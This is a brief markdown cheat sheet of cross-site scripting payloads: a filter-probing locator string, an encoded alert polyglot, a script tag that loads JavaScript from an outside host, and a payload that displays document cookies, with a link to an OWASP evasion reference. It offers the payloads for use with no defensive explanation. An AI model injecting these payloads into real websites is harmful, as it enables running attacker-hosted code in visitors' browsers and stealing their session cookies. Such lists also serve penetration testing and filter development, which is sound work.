# xss
### xss locator
```
"';!--"<XSS>=&{()}
```

```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

### expoits

```
<script src=http://peniscorp.com/topkek.js>
```

```
<script>alert(document.cookie)</script>
```

### references
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
